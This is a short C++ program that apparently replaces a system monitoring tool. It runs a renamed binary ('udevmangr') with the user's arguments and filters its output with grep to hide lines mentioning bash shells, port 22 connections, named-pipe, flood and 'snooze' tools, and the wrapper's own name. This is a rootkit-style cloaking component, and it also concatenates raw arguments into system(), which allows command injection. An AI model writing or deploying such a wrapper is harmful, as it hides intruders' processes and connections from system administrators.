
#include <iostream>
#include <cstdlib>
using namespace std;
int main( int argc, char * argv[] )
{
    string command="udevmangr";
    string space=" ";
    string grepout=" |grep -v 'sh -c'| grep -v bash| grep -v :22| grep -v mknodfifo| grep -v udevmangr| grep -v flood| grep -v snooze| grep -v settypefc";
    for (int i=1; i <argc; i++)
    {
        command = command + space + argv[i];
    }

    command+=grepout;
    system((command).c_str());
    return 0;
}

    